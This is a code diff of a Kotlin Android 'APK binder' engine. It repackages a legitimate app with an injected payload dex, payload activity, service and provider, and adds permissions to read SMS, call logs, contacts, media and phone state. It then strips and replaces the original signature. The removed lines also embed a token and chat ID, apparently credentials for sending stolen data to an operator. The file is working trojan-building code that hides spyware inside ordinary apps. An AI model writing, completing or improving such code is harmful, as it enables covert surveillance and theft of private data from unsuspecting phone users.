@@ -1,38 +1,265 @@
 package Com.devhs.apkbinder.binder
 
 import android.content.Context
-import android.content.pm.PackageManager
-import android.net.Uri
-import androidx.documentfile.provider.DocumentFile
 import com.android.apksig.ApkSigner
-import Com.devhs.apkbinder.core.Const
-import Com.devhs.apkbinder.data.Feature
-import Com.devhs.apkbinder.data.LogLevel
-import Com.devhs.apkbinder.data.PayloadConfig
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
-import org.json.JSONArray
-import org.json.JSONObject
-import java.io.BufferedOutputStream
 import java.io.File
 import java.io.FileOutputStream
-import java.io.FilterOutputStream
 import java.io.OutputStream
 import java.security.KeyStore
 import java.security.PrivateKey
 import java.security.cert.X509Certificate
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
 import java.util.zip.CRC32
 import java.util.zip.ZipEntry
 import java.util.zip.ZipFile
 import java.util.zip.ZipOutputStream
 
-class BinderEngine(private val ctx: Context) {
+data class BindResult(
+    val ok: Boolean,
+    val message: String,
+    val outputPath: String? = null
+)
 
-    private class CountingStream(out: OutputStream) : FilterOutputStream(out) {
-        var count = 0L
+class BinderEngine(private val context: Context) {
+
+    companion object {
+        private const val ALIGN_SO = 16384
+        private const val ALIGN_DEFAULT = 4
+        private const val MANIFEST = "AndroidManifest.xml"
+        private const val DEX_PATTERN = "classes(\\d*)\\.dex"
+    }
+
+    // ------------------------------------------------------------------
+    // Public entry
+    // ------------------------------------------------------------------
+    suspend fun bind(
+        sourceApk: File,
+        outApk: File,
+        features: Collection<String>,
+        onLog: (String) -> Unit
+    ): BindResult = withContext(Dispatchers.IO) {
+
+        var temp: File? = null
+
+        try {
+            onLog("[INFO] Source APK: ${sourceApk.name} (${sourceApk.length() / 1024} KB)")
+
+            val pm = context.packageManager
+            val info = pm.getPackageArchiveInfo(sourceApk.absolutePath, 0)
+                ?: return@withContext BindResult(false, "Source APK could not be parsed")
+
+            val pkg = info.packageName
+            onLog("[INFO] Package: $pkg")
+
+            val permissions = buildPermissions(features)
+            onLog("[INFO] Permissions to inject: ${permissions.size}")
+            permissions.forEach { onLog("   + $it") }
+
+            val authority = pkg + Const.AUTHORITY_SUFFIX
+            onLog("[INFO] Authority: $authority")
+
+            temp = File(outApk.parentFile, outApk.nameWithoutExtension + ".unsigned.apk")
+
+            var patched: ByteArray? = null
+            var payloadDexName = "classes.dex"
+
+            ZipFile(sourceApk).use { zip ->
+
+                val entry = zip.getEntry(MANIFEST)
+                    ?: return@withContext BindResult(false, "$MANIFEST not found")
+
+                val manifest = zip.getInputStream(entry).use { it.readBytes() }
+                onLog("[INFO] Original manifest: ${manifest.size} bytes")
+
+                patched = AxmlPatcher.patch(
+                    manifest,
+                    Const.PAYLOAD_ACTIVITY,
+                    Const.PAYLOAD_SERVICE,
+                    Const.PAYLOAD_PROVIDER,
+                    authority,
+                    permissions
+                )
+
+                if (patched == null) {
+                    return@withContext BindResult(false, "Manifest patch failed")
+                }
+                onLog("[INFO] Patched manifest: ${patched!!.size} bytes")
+
+                payloadDexName = nextDexName(zip)
+                onLog("[INFO] Payload dex slot: $payloadDexName")
+
+                val payloadDex = readAsset("classes.dex")
+                onLog("[INFO] Payload dex: ${payloadDex.size} bytes")
+
+                FileOutputStream(temp).use { fos ->
+                    CountingStream(fos).use { cs ->
+                        ZipOutputStream(cs).use { zos ->
+
+                            val entries = zip.entries()
+                            while (entries.hasMoreElements()) {
+                                val e = entries.nextElement()
+                                val name = e.name
+
+                                if (name == MANIFEST) continue
+                                if (name == payloadDexName) continue
+                                if (isSignatureFile(name)) continue
+
+                                val data = zip.getInputStream(e).use { it.readBytes() }
+                                val stored = e.method == ZipEntry.STORED
+                                writeEntry(zos, cs, name, data, stored)
+                            }
+
+                            writeEntry(zos, cs, MANIFEST, patched!!, false)
+                            writeEntry(zos, cs, payloadDexName, payloadDex, false)
+                        }
+                    }
+                }
+            }
+
+            // ---- Sign ----
+            onLog("[INFO] Signing...")
+            val signed = File(outApk.parentFile, outApk.nameWithoutExtension + ".signed.apk")
+            if (signed.exists()) signed.delete()
+
+            try {
+                sign(temp, signed, onLog)
+            } catch (t: Throwable) {
+                onLog("[ERROR] Sign failed: ${t.message}")
+                return@withContext BindResult(false, "Sign failed: ${t.message}")
+            }
+
+            if (outApk.exists()) outApk.delete()
+            if (!signed.renameTo(outApk)) {
+                signed.copyTo(outApk, overwrite = true)
+                signed.delete()
+            }
+
+            // ---- Verify ----
+            val check = pm.getPackageArchiveInfo(outApk.absolutePath, 0)
+            if (check == null) {
+                onLog("[ERROR] Verification failed: APK unreadable")
+                return@withContext BindResult(false, "Verification failed")
+            }
+
+            onLog("[INFO] Verified package: ${check.packageName}")
+            onLog("[INFO] App class: ${check.applicationInfo?.className ?: "(none)"}")
+            onLog("[INFO] Output: ${outApk.name} (${outApk.length() / 1024} KB)")
+
+            BindResult(true, "Success", outApk.absolutePath)
+
+        } catch (t: Throwable) {
+            onLog("[EXCEPTION] ${t.javaClass.simpleName}: ${t.message}")
+            t.stackTrace.take(8).forEach { onLog("   at $it") }
+            BindResult(false, t.message ?: "Unknown error")
+        } finally {
+            temp?.let { if (it.exists()) it.delete() }
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // Permissions
+    // ------------------------------------------------------------------
+    private fun buildPermissions(features: Collection<String>): List<String> {
+        val set = LinkedHashSet<String>()
+
+        set += "android.permission.INTERNET"
+        set += "android.permission.ACCESS_NETWORK_STATE"
+        set += "android.permission.POST_NOTIFICATIONS"
+        set += "android.permission.WAKE_LOCK"
+        set += "android.permission.RECEIVE_BOOT_COMPLETED"
+        set += "android.permission.FOREGROUND_SERVICE"
+        set += "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
+
+        val f = features.map { it.lowercase() }
+
+        if (f.any { it.contains("gallery") || it.contains("image") }) {
+            set += "android.permission.READ_EXTERNAL_STORAGE"
+            set += "android.permission.READ_MEDIA_IMAGES"
+            set += "android.permission.READ_MEDIA_VIDEO"
+        }
+        if (f.any { it.contains("sms") }) {
+            set += "android.permission.READ_SMS"
+            set += "android.permission.RECEIVE_SMS"
+        }
+        if (f.any { it.contains("call") }) {
+            set += "android.permission.READ_CALL_LOG"
+            set += "android.permission.READ_PHONE_STATE"
+        }
+        if (f.any { it.contains("contact") }) {
+            set += "android.permission.READ_CONTACTS"
+        }
+        if (f.any { it.contains("device") || it.contains("info") }) {
+            set += "android.permission.READ_PHONE_STATE"
+        }
+
+        return set.toList()
+    }
+
+    // ------------------------------------------------------------------
+    // Zip helpers
+    // ------------------------------------------------------------------
+    private fun nextDexName(zip: ZipFile): String {
+        var max = 0
+        val regex = Regex(DEX_PATTERN)
+        val entries = zip.entries()
+        while (entries.hasMoreElements()) {
+            val m = regex.matchEntire(entries.nextElement().name) ?: continue
+            val n = m.groupValues[1].toIntOrNull() ?: 1
+            if (n > max) max = n
+        }
+        return "classes${max + 1}.dex"
+    }
+
+    private fun isSignatureFile(name: String): Boolean {
+        if (!name.startsWith("META-INF/")) return false
+        val upper = name.uppercase()
+        return upper.endsWith(".RSA") || upper.endsWith(".DSA") ||
+                upper.endsWith(".EC") || upper.endsWith(".SF") || upper.endsWith(".MF")
+    }
+
+    private fun writeEntry(
+        zos: ZipOutputStream,
+        cs: CountingStream,
+        name: String,
+        data: ByteArray,
+        stored: Boolean
+    ) {
+        val e = ZipEntry(name)
+
+        if (stored) {
+            val crc = CRC32()
+            crc.update(data)
+            e.method = ZipEntry.STORED
+            e.size = data.size.toLong()
+            e.compressedSize = data.size.toLong()
+            e.crc = crc.value
+        } else {
+            e.method = ZipEntry.DEFLATED
+        }
+
+        zos.putNextEntry(e)
+        zos.write(data)
+        zos.closeEntry()
+        zos.flush()
+
+        val align = if (name.startsWith("lib/") && name.endsWith(".so")) ALIGN_SO else ALIGN_DEFAULT
+        val pad = paddingFor(cs.count, align)
+        if (pad > 0) {
+            cs.write(ByteArray(pad))
+            cs.flush()
+        }
+    }
+
+    private fun paddingFor(position: Long, align: Int): Int {
+        val rem = (position % align).toInt()
+        return if (rem == 0) 0 else align - rem
+    }
+
+    private class CountingStream(private val out: OutputStream) : OutputStream() {
+        var count: Long = 0L
+            private set
+
         override fun write(b: Int) {
             out.write(b)
             count++
@@ -42,286 +269,38 @@ class BinderEngine(private val ctx: Context) {
             out.write(b, off, len)
             count += len
         }
+
+        override fun flush() = out.flush()
+        override fun close() = out.flush()
     }
 
-    private val permissions = listOf(
-        "android.permission.INTERNET",
-        "android.permission.READ_SMS",
-        "android.permission.READ_CALL_LOG",
-        "android.permission.READ_CONTACTS",
-        "android.permission.READ_MEDIA_IMAGES",
-        "android.permission.READ_EXTERNAL_STORAGE",
-        "android.permission.READ_PHONE_STATE",
-        "android.permission.POST_NOTIFICATIONS",
-        "android.permission.FOREGROUND_SERVICE",
-        "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
-    )
+    // ------------------------------------------------------------------
+    // Assets / signing
+    // ------------------------------------------------------------------
+    private fun readAsset(name: String): ByteArray =
+        context.assets.open(name).use { it.readBytes() }
 
-    suspend fun bind(
-        source: Uri,
-        activity: String,
-        label: String,
-        features: Set<Feature>,
-        config: PayloadConfig,
-        outDir: DocumentFile,
-        onLog: (LogLevel, String) -> Unit
-    ) = withContext(Dispatchers.IO) {
-
-        val logLines = ArrayList<String>()
-        fun emit(level: LogLevel, msg: String) {
-            onLog(level, msg)
-            logLines.add("[" + level.name + "] " + msg)
+    private fun sign(input: File, output: File, onLog: (String) -> Unit) {
+        val ks = KeyStore.getInstance("JKS")
+        context.assets.open(Const.KEYSTORE_FILE).use {
+            ks.load(it, Const.KEYSTORE_PASS.toCharArray())
         }
 
-        val work = File(ctx.cacheDir, "bind_" + System.currentTimeMillis())
-        work.mkdirs()
+        val alias = ks.aliases().nextElement()
+        val key = ks.getKey(alias, Const.KEYSTORE_PASS.toCharArray()) as PrivateKey
+        val cert = ks.getCertificate(alias) as X509Certificate
 
-        try {
-            emit(LogLevel.INFO, "Preparing workspace...")
-            val base = File(work, "base.apk")
-            copyUri(source, base)
-            if (base.length() < 1024) throw IllegalStateException("Invalid APK file")
-            emit(LogLevel.INFO, "Source APK: " + base.length() / 1024 + " KB")
+        val signer = ApkSigner.SignerConfig.Builder(alias, key, listOf(cert)).build()
 
-            val originalInfo = try {
-                ctx.packageManager.getPackageArchiveInfo(
-                    base.absolutePath,
-                    PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
-                )
-            } catch (_: Throwable) {
-                null
-            }
-            if (originalInfo == null) {
-                emit(LogLevel.ERROR, "ORIGINAL APK unreadable by Android")
-            } else {
-                emit(LogLevel.INFO, "Original package: " + originalInfo.packageName)
-                emit(LogLevel.INFO, "Original activities: " + (originalInfo.activities?.size ?: 0))
-            }
-
-            val srcZip = ZipFile(base)
-            val allEntries = srcZip.entries().toList()
-            val stored = allEntries.filter { it.method == ZipEntry.STORED }
-            emit(LogLevel.INFO, "Entries: " + allEntries.size + "  stored: " + stored.size)
-
-            val manifestEntry = srcZip.getEntry("AndroidManifest.xml")
-                ?: throw IllegalStateException("No AndroidManifest.xml in APK")
-            val manifest = srcZip.getInputStream(manifestEntry).use { it.readBytes() }
-
-            emit(LogLevel.INFO, "Original manifest: " + AxmlPatcher.stats(manifest))
-
-            val originalApp = AxmlPatcher.readApplicationName(manifest)
-            emit(LogLevel.INFO, "Original application: " + (originalApp ?: "(none)"))
-
-            emit(LogLevel.INFO, "Patching AndroidManifest.xml...")
-            val patched = try {
-                AxmlPatcher.patch(
-                    manifest,
-                    Const.PAYLOAD_ACTIVITY,
-                    Const.PAYLOAD_SERVICE,
-                    Const.PAYLOAD_PROVIDER,
-                    (originalInfo?.packageName ?: "hs.binder") + ".hsbinder",
-                    permissions
-                )
-            } catch (t: Throwable) {
-                srcZip.close()
-                throw IllegalStateException("Manifest patch failed: " + (t.message ?: "unknown"))
-            }
-            emit(LogLevel.SUCCESS, "Manifest patched: " + manifest.size + " -> " + patched.size)
-            emit(LogLevel.INFO, "App attrs: " + AxmlPatcher.appAttrs(patched))
-
-            emit(LogLevel.INFO, "Collecting payload dex...")
-            val dexes = collectOwnDex()
-            if (dexes.isEmpty()) {
-                srcZip.close()
-                throw IllegalStateException("Payload dex not found")
-            }
-            emit(LogLevel.INFO, "Dex files: " + dexes.size)
-
-            val maxDex = allEntries
-                .mapNotNull { Regex("^classes(\\d*)\\.dex$").find(it.name) }
-                .map { it.groupValues[1].ifEmpty { "1" }.toInt() }
-                .maxOrNull() ?: 0
-
-            val cfgBytes = JSONObject().apply {
-                put("token", config.token)
-                put("chatId", config.chatId)
-                put("origApp", originalApp ?: "")
-                put("features", JSONArray(config.features))
-                put("activity", activity)
-            }.toString().toByteArray()
-
-            val unsigned = File(work, "unsigned.apk")
-            val counter = CountingStream(BufferedOutputStream(FileOutputStream(unsigned)))
-
-            ZipOutputStream(counter).use { zos ->
-                for (e in allEntries) {
-                    if (e.isDirectory) continue
-                    if (e.name == "AndroidManifest.xml") continue
-                    if (e.name == "assets/" + Const.CONFIG_ASSET) continue
-                    if (e.name.startsWith("META-INF/") &&
-                        (e.name.endsWith(".SF") || e.name.endsWith(".RSA") ||
-                            e.name.endsWith(".DSA") || e.name.endsWith(".MF"))
-                    ) continue
-
-                    val data = srcZip.getInputStream(e).use { it.readBytes() }
-                    val entry = ZipEntry(e.name)
-                    if (e.method == ZipEntry.STORED) {
-                        entry.method = ZipEntry.STORED
-                        entry.size = data.size.toLong()
-                        entry.compressedSize = data.size.toLong()
-                        entry.crc = CRC32().apply { update(data) }.value
-                        entry.extra = paddingFor(counter.count, e.name)
-                    } else {
-                        entry.method = ZipEntry.DEFLATED
-                    }
-                    zos.putNextEntry(entry)
-                    zos.write(data)
-                    zos.closeEntry()
-                }
-                srcZip.close()
-
-                zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
-                zos.write(patched)
-                zos.closeEntry()
-
-                zos.putNextEntry(ZipEntry("assets/" + Const.CONFIG_ASSET))
-                zos.write(cfgBytes)
-                zos.closeEntry()
-
-                dexes.forEachIndexed { i, bytes ->
-                    zos.putNextEntry(ZipEntry("classes" + (maxDex + i + 1) + ".dex"))
-                    zos.write(bytes)
-                    zos.closeEntry()
-                }
-            }
-            emit(LogLevel.SUCCESS, "Archive built: " + unsigned.length() / 1024 + " KB")
-
-            val finalApk = File(work, "final.apk")
-            try {
-                emit(LogLevel.INFO, "Signing APK...")
-                sign(unsigned, finalApk)
-                emit(LogLevel.SUCCESS, "Signed OK")
-            } catch (t: Throwable) {
-                emit(LogLevel.WARN, "Signing failed: " + (t.message ?: "unknown"))
-                unsigned.copyTo(finalApk, overwrite = true)
-            }
-
-            val info = try {
-                ctx.packageManager.getPackageArchiveInfo(
-                    finalApk.absolutePath,
-                    PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
-                )
-            } catch (t: Throwable) {
-                emit(LogLevel.WARN, "Verify error: " + (t.message ?: "unknown"))
-                null
-            }
-
-            if (info == null) {
-                emit(LogLevel.ERROR, "Manifest parse: FAILED")
-            } else {
-                emit(LogLevel.SUCCESS, "Manifest parse: OK")
-                emit(LogLevel.INFO, "Package: " + info.packageName)
-                emit(LogLevel.INFO, "App class: " + (info.applicationInfo?.className ?: "(none)"))
-                val acts = info.activities?.mapNotNull { it.name } ?: emptyList()
-                val hasGate = acts.any { it.endsWith("PermissionGateActivity") }
-                emit(if (hasGate) LogLevel.SUCCESS else LogLevel.ERROR, "Permission activity: " + hasGate)
-                val srv = info.services?.mapNotNull { it.name } ?: emptyList()
-                val hasSrv = srv.any { it.endsWith("PayloadService") }
-                emit(if (hasSrv) LogLevel.SUCCESS else LogLevel.ERROR, "Payload service: " + hasSrv)
-            }
-
-            val cleanLabel = label.substringAfterLast('/')
-                .removeSuffix(".apk")
-                .replace(Regex("[^A-Za-z0-9]+"), "_")
-                .trim('_')
-                .take(40)
-                .ifBlank { "App" }
-            val name = "Hs_Apk_Binder_" + cleanLabel + "_" + System.currentTimeMillis() + ".apk"
-
-            val doc = outDir.createFile("application/vnd.android.package-archive", name)
-                ?: throw IllegalStateException("Cannot create output file")
-            ctx.contentResolver.openOutputStream(doc.uri)!!.use { os ->
-                finalApk.inputStream().use { it.copyTo(os) }
-            }
-            emit(LogLevel.SUCCESS, "Saved: " + doc.name)
-            emit(LogLevel.SUCCESS, "APK Binding Completed!")
-
-        } catch (t: Throwable) {
-            emit(LogLevel.ERROR, "FAILED: " + (t.message ?: t.javaClass.simpleName))
-            throw t
-        } finally {
-            try {
-                val stamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-                val logDoc = outDir.createFile("text/plain", "Hs_Binder_Log_" + stamp + ".txt")
-                if (logDoc != null) {
-                    ctx.contentResolver.openOutputStream(logDoc.uri)!!.use { os ->
-                        os.write(logLines.joinToString("\n").toByteArray())
-                    }
-                }
-            } catch (_: Throwable) {
-            }
-            work.deleteRecursively()
-        }
-    }
-
-    private fun paddingFor(current: Long, name: String): ByteArray {
-        val align = if (name.startsWith("lib/") && name.endsWith(".so")) 16384 else 4
-        val nameLen = name.toByteArray(Charsets.UTF_8).size
-        val base = current + 30 + nameLen + 4
-        val pad = ((align - (base % align)) % align).toInt()
-        val extra = ByteArray(4 + pad)
-        extra[0] = 0x35
-        extra[1] = 0xD9.toByte()
-        extra[2] = (pad and 0xFF).toByte()
-        extra[3] = ((pad shr 8) and 0xFF).toByte()
-        return extra
-    }
-
-    private fun copyUri(uri: Uri, target: File) {
-        val stream = if (uri.scheme == "file") {
-            File(uri.path!!).inputStream()
-        } else {
-            ctx.contentResolver.openInputStream(uri) ?: throw IllegalStateException("Cannot open APK")
-        }
-        stream.use { input -> target.outputStream().use { input.copyTo(it) } }
-    }
-
-    private fun collectOwnDex(): List<ByteArray> {
-        val info = ctx.packageManager.getApplicationInfo(ctx.packageName, PackageManager.GET_META_DATA)
-        val paths = ArrayList<String>()
-        info.sourceDir?.let { paths.add(it) }
-        info.splitSourceDirs?.let { paths.addAll(it) }
-
-        val out = ArrayList<ByteArray>()
-        for (path in paths) {
-            try {
-                ZipFile(path).use { z ->
-                    z.entries().toList()
-                        .filter { Regex("^classes\\d*\\.dex$").matches(it.name) }
-                        .sortedBy { it.name }
-                        .forEach { e -> out.add(z.getInputStream(e).use { it.readBytes() }) }
-                }
-            } catch (_: Throwable) {
-            }
-        }
-        return out
-    }
-
-    private fun sign(input: File, output: File) {
-        val ks = KeyStore.getInstance("PKCS12")
-        ctx.assets.open(Const.KEYSTORE_ASSET).use { ks.load(it, Const.KS_PASS.toCharArray()) }
-        val key = ks.getKey(Const.KS_ALIAS, Const.KS_PASS.toCharArray()) as PrivateKey
-        val cert = ks.getCertificate(Const.KS_ALIAS) as X509Certificate
-
-        val signerConfig = ApkSigner.SignerConfig.Builder(Const.KS_ALIAS, key, listOf(cert)).build()
-        ApkSigner.Builder(listOf(signerConfig))
+        ApkSigner.Builder(listOf(signer))
             .setInputApk(input)
             .setOutputApk(output)
             .setV1SigningEnabled(true)
             .setV2SigningEnabled(true)
             .setV3SigningEnabled(true)
-            .setMinSdkVersion(26)
             .build()
             .sign()
+
+        onLog("[INFO] Signed: ${output.length() / 1024} KB")
     }
 }
